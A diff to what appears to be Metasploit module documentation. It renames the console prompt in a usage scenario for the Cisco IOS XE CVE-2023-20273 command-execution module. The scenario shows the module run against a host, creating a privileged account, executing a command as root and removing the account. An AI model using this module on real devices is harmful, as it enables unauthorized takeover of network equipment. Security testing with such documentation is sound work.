@@ -92,7 +92,7 @@ can be locked preventing deleting upon the first attempt, so the module will try
 ## Scenarios
 
 ```
-msf6 auxiliary(admin/http/cisco_ios_xe_os_exec_cve_2023_20273) > show options
+msf auxiliary(admin/http/cisco_ios_xe_os_exec_cve_2023_20273) > show options
 
 Module options (auxiliary/admin/http/cisco_ios_xe_os_exec_cve_2023_20273):
 
@@ -115,11 +115,11 @@ Module options (auxiliary/admin/http/cisco_ios_xe_os_exec_cve_2023_20273):
 
 View the full module info with the info, or info -d command.
 
-msf6 auxiliary(admin/http/cisco_ios_xe_os_exec_cve_2023_20273) > set rhosts 10.5.135.193
+msf auxiliary(admin/http/cisco_ios_xe_os_exec_cve_2023_20273) > set rhosts 10.5.135.193
 rhosts => 10.5.135.193
-msf6 auxiliary(admin/http/cisco_ios_xe_os_exec_cve_2023_20273) > set verbose true
+msf auxiliary(admin/http/cisco_ios_xe_os_exec_cve_2023_20273) > set verbose true
 verbose => true
-msf6 auxiliary(admin/http/cisco_ios_xe_os_exec_cve_2023_20273) > run
+msf auxiliary(admin/http/cisco_ios_xe_os_exec_cve_2023_20273) > run
 [*] Running module against 10.5.135.193
 
 [*] Created privilege 15 user 'rfojGrqA' with password 'ixnXyFlw'
@@ -129,5 +129,5 @@ uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:polaris_nginx_t
 [*] Removing user 'rfojGrqA'
 [*] Auxiliary module execution completed
 
-msf6 auxiliary(admin/http/cisco_ios_xe_os_exec_cve_2023_20273) > 
+msf auxiliary(admin/http/cisco_ios_xe_os_exec_cve_2023_20273) > 
 ```
